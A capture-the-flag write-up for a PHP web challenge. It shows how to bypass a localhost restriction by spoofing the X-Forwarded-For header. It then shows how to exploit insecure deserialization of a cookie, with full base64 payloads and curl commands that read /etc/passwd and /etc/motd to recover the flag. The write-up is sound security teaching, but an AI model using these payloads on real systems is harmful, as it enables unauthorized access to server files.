## **Message of the Day writeup**

1. Main page is unaccessible, 403 error.

![enter image description here](https://raw.githubusercontent.com/grazieragazzi/GRZblog/master/Picture7.png)

2. Firstly, we need to find "backup" directory, which contains application's source code.

![enter image description here](https://raw.githubusercontent.com/grazieragazzi/GRZblog/master/Picture8.png)

3. 

![enter image description here](https://raw.githubusercontent.com/grazieragazzi/GRZblog/master/Picture9.png)

Application allows access only from 127.0.0.1 (localhost), but also checking if client went through proxy (X-Forwarded-For header). This check is easy to pass:

    curl -H “X-Forwarded-For: 127.0.0.1” http://localhost:8888/

![enter image description here](https://raw.githubusercontent.com/grazieragazzi/GRZblog/master/Picture10.png)

4. Now we have cookies:

client=Tzo2OiJDbGllbnQiOjI6e3M6MTI6IgBDbGllbnQAbmFtZSI7czo1OiJHdWVzdCI7czoxMToiAENsaWVudAB0bXAiO086NzoiTWVzc2FnZSI6MDp7fX0=

Let's decode them:

    O:6:"Client":2:{s:12:"�Client�name";s:5:"Guest";s:11:"�Client�tmp";O:7:"Message":0:{}}

Here we have serialized object of "Client" class and two variables of that class: "name" and "tmp".

5. 

![enter image description here](https://raw.githubusercontent.com/grazieragazzi/GRZblog/master/Picture11.png)

In "client.php" code we see "include('read.php')". It means that for "tmp" variable we can assign object of "Read" class instead of "Message".

![enter image description here](https://raw.githubusercontent.com/grazieragazzi/GRZblog/master/Picture12.png)

Using the "print" function from class "Read" we can access local files.
So, payload should be something like this:

    O:6:"Client":2:{s:12:"Clientname";s:5:"Guest";s:11:"Clienttmp";O:4:"Read":1:{s:15:"Readfile_name";s:11:"/etc/passwd";}}

I'm using PHP private variables here. So, if we have private variable of "Client" class named "name", then in serialized object her name will look like a composition of class name and variable: "Clientname". Besides, before class name and variable name I'll put the null character "\0". I'll create my payload and encode it using "base64_encode function" of PHP:

    echo base64_encode("O:6:\"Client\":2:{s:12:\"\0Client\0name\";s:5:\"Guest\";s:11:\"\0Client\0tmp\";O:4:\"Read\":1:{s:15:\"\0Read\0file_name\";s:11:\"/etc/passwd\";}}");

![enter image description here](https://raw.githubusercontent.com/grazieragazzi/GRZblog/master/Picture13.png)

Let's put this result into the Cookies:

    curl -H "X-Forwarded-For: 127.0.0.1" -H "Cookie: client=Tzo2OiJDbGllbnQiOjI6e3M6MTI6IgBDbGllbnQAbmFtZSI7czo1OiJHdWVzdCI7czoxMToiAENsaWVudAB0bXAiO086NDoiUmVhZCI6MTp7czoxNToiAFJlYWQAZmlsZV9uYW1lIjtzOjExOiIvZXRjL3Bhc3N3ZCI7fX0=" -i http://localhost:8888/

![enter image description here](https://raw.githubusercontent.com/grazieragazzi/GRZblog/master/Picture14.png)

6. All that's left is to find the flag. Name of the task gives a hint on where to search for it (Message of the Day, /etc/motd):


>


    echo base64_encode("O:6:\"Client\":2:{s:12:\"\0Client\0name\";s:5:\"Guest\";s:11:\"\0Client\0tmp\";O:4:\"Read\":1:{s:15:\"\0Read\0file_name\";s:9:\"/etc/motd\";}}");

![enter image description here](https://raw.githubusercontent.com/grazieragazzi/GRZblog/master/Picture15.png)

Let's put this into the Cookie header:


    curl -H "X-Forwarded-For: 127.0.0.1" -H "Cookie: client=Tzo2OiJDbGllbnQiOjI6e3M6MTI6IgBDbGllbnQAbmFtZSI7czo1OiJHdWVzdCI7czoxMToiAENsaWVudAB0bXAiO086NDoiUmVhZCI6MTp7czoxNToiAFJlYWQAZmlsZV9uYW1lIjtzOjk6Ii9ldGMvbW90ZCI7fX0=" -i http://localhost:8888/

![enter image description here](https://raw.githubusercontent.com/grazieragazzi/GRZblog/master/Picture16.png)

Flag: flag{0h_y0u_f0und_m3_51r!}
